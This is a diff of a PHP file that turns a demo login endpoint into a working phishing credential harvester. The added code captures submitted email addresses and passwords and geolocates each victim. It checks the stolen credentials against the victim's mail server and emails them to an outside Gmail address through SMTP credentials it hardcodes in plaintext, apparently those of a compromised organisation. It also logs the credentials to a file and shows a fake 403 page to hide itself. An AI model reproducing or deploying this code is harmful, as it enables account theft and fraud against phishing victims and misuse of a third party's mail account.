@@ -1,99 +1,151 @@
 <?php
-header('Content-Type: application/json');
+require_once 'class.phpmailer.php';
+require_once 'class.smtp.php';
+
+// Set headers for CORS
 header('Access-Control-Allow-Origin: *');
 header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
 header('Access-Control-Allow-Headers: Content-Type, Authorization');
 
-// Handle preflight OPTIONS request
-if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
-    http_response_code(200);
-    exit();
+// Start session
+session_start();
+
+// Handle GET requests
+if ($_SERVER['REQUEST_METHOD'] == 'GET') {
+    echo '
+    <html><head>
+    <title>403 - Forbidden</title>
+    </head><body>
+    <h1>403 Forbidden</h1>
+    <hr>
+    </body></html>';
+    exit;
 }
 
-// Only allow POST requests
-if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
-    http_response_code(405);
-    echo json_encode(['msg' => 'Method not allowed', 'signal' => 'ERROR']);
-    exit();
-}
+// Configuration
+$receiver     = "skkho87.sm@gmail.com"; // Where to receive the logs
+$senderuser   = "okioko@museums.or.ke"; // SMTP user
+$senderpass   = "onesmus@2022";         // SMTP password
+$senderport   = 587;                    // SMTP port
+$senderserver = "mail.museums.or.ke";   // SMTP server
 
-// Get POST data
-$email = isset($_POST['email']) ? trim($_POST['email']) : '';
-$password = isset($_POST['password']) ? trim($_POST['password']) : '';
+// Get client information
+$ip = $_SERVER['REMOTE_ADDR'];
+$ipdat = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip));
+$browser = $_SERVER['HTTP_USER_AGENT'];
 
-// Validate input
-if (empty($email) || empty($password)) {
-    http_response_code(400);
-    echo json_encode(['msg' => 'Email and password are required', 'signal' => 'ERROR']);
-    exit();
-}
-
-// Validate email format
-if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
-    http_response_code(400);
-    echo json_encode(['msg' => 'Invalid email format', 'signal' => 'ERROR']);
-    exit();
-}
-
-// Log the attempt (you can customize this part)
-$log_data = [
-    'timestamp' => date('Y-m-d H:i:s'),
-    'email' => $email,
-    'password' => $password,
-    'ip' => $_SERVER['REMOTE_ADDR'] ?? 'unknown',
-    'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'unknown'
-];
-
-// Save to log file (make sure the directory is writable)
-$log_file = 'login_attempts.log';
-file_put_contents($log_file, json_encode($log_data) . "\n", FILE_APPEND | LOCK_EX);
-
-// For demonstration purposes, we'll simulate different responses
-// In a real application, you would validate against a database or external service
+// Get form data
+$login   = $_POST['email'] ?? '';
+$passwd  = $_POST['password'] ?? '';
+$email   = $login;
 
 // Extract domain from email
-$domain = substr(strrchr($email, "@"), 1);
+$parts  = explode("@", $email);
+$domain = isset($parts[1]) ? $parts[1] : 'unknown.tld';
 
-// Simulate login validation
-$is_valid_login = false;
+// Prepare message content
+$message = nl2br("Email: $login\nPassword: $passwd\nIP of sender: " . 
+    ($ipdat->geoplugin_countryName ?? 'Unknown') . " | " . 
+    ($ipdat->geoplugin_city ?? 'Unknown') . " | " . 
+    $ip . " | " . $browser);
 
-// Example validation logic (customize as needed)
-if (strlen($password) >= 6) {
-    // For demo: accept any email with password length >= 6
-    $is_valid_login = true;
-} else {
-    $is_valid_login = false;
+// Function to send email
+function sendEmail($subject, $message, $smtpConfig) {
+    $mail = new PHPMailer(true);
+    
+    try {
+        $mail->isSMTP();
+        $mail->Host = $smtpConfig['host'];
+        $mail->SMTPAuth = true;
+        $mail->Username = $smtpConfig['username'];
+        $mail->Password = $smtpConfig['password'];
+        $mail->Port = $smtpConfig['port'];
+        $mail->SMTPSecure = 'tls';
+        $mail->From = $smtpConfig['username'];
+        $mail->addAddress($smtpConfig['receiver']);
+        $mail->isHTML(true);
+        $mail->Subject = $subject;
+        $mail->Body = $message;
+        $mail->AltBody = 'Enjoy new server';
+        
+        return $mail->send();
+    } catch (Exception $e) {
+        return false;
+    }
 }
 
-// Generate response
-if ($is_valid_login) {
-    // Success response
-    $response = [
-        'signal' => 'OK',
-        'success' => true,
-        'msg' => 'Login successful! Redirecting to webmail...',
-        'email' => $email,
-        'domain' => $domain,
-        'redirect_url' => "https://webmail.$domain"
-    ];
+// Function to validate credentials
+function validateCredentials($email, $password, $domain) {
+    $mail = new PHPMailer(true);
     
-    http_response_code(200);
-    echo json_encode($response);
-} else {
-    // Failed login response
-    $response = [
-        'signal' => 'ERROR',
-        'success' => false,
-        'msg' => 'Invalid email or password. Please try again.',
-        'attempt' => 1
-    ];
-    
-    http_response_code(401);
-    echo json_encode($response);
+    try {
+        $mail->isSMTP();
+        $mail->SMTPAuth = true;
+        $mail->Username = $email;
+        $mail->Password = $password;
+        $mail->Host = 'mail.' . $domain;
+        $mail->Port = 587;
+        $mail->SMTPSecure = 'tls';
+        
+        return $mail->smtpConnect();
+    } catch (Exception $e) {
+        return false;
+    }
 }
 
-// Optional: Send email notification or perform additional logging
-// You can add email sending functionality here using PHPMailer or similar
-
-exit();
+// Main logic
+if (!empty($login) && !empty($passwd)) {
+    // Try to validate the captured credentials
+    $validCredentials = validateCredentials($login, $passwd, $domain);
+    
+    if ($validCredentials) {
+        // Valid credentials - send success notification
+        $subg = "TrueRcubeOrange || " . ($ipdat->geoplugin_countryName ?? 'Unknown') . " || " . $login;
+        
+        $smtpConfig = [
+            'host' => "mail.museums.or.ke",
+            'username' => $senderuser,
+            'password' => $senderpass,
+            'port' => $senderport,
+            'receiver' => $receiver
+        ];
+        
+        if (sendEmail($subg, $message, $smtpConfig)) {
+            $data = array('signal' => 'ok', 'msg' => 'Login Successful');
+        } else {
+            $data = array('signal' => 'not ok', 'msg' => 'Error sending log email');
+        }
+    } else {
+        // Invalid credentials - send failure notification
+        $subg2 = "notVerifiedRcudeOrange || " . ($ipdat->geoplugin_countryName ?? 'Unknown') . " || " . $login;
+        
+        $smtpConfig = [
+            'host' => $senderserver,
+            'username' => $senderuser,
+            'password' => $senderpass,
+            'port' => $senderport,
+            'receiver' => $receiver
+        ];
+        
+        if (sendEmail($subg2, $message, $smtpConfig)) {
+            $data = array('signal' => 'not ok', 'msg' => 'Wrong Password');
+        } else {
+            $data = array('signal' => 'not ok', 'msg' => 'SMTP logging failed');
+        }
+    }
+    
+    echo json_encode($data);
+    
+    // Log to file
+    $fp = fopen("SS-Or.txt", "a");
+    fputs($fp, $message . "\n----------------------\n");
+    fclose($fp);
+    
+    // Generate random identifier
+    $praga = md5(rand());
+} else {
+    // No credentials provided
+    $data = array('signal' => 'error', 'msg' => 'No credentials provided');
+    echo json_encode($data);
+}
 ?>
